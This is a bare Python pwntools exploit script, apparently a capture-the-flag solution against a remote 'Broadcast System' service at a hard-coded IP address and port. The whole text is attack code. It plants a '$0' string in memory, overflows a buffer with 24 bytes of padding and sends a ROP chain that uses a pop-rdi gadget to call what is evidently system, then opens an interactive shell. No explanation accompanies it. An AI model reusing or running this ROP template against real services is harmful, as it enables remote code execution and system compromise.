from pwn import *
context.log_level = 'debug'
#p = process('./Broadcast System')
p = remote('39.97.167.120', '56725')
e = ELF('./Broadcast System')
p.recv()
p.sendline('$0\x00')


def broad(text):
    p.recvuntil('choice:\n')
    p.sendline('B')
    p.recvuntil('broadcast:\n')
    p.send(text)


pop_rdi = 0x400de3

padding = 'a'*24
payload = padding+p64(pop_rdi)+p64(0x6020D0)+p64(0x400AFB)


broad(payload)

p.interactive()
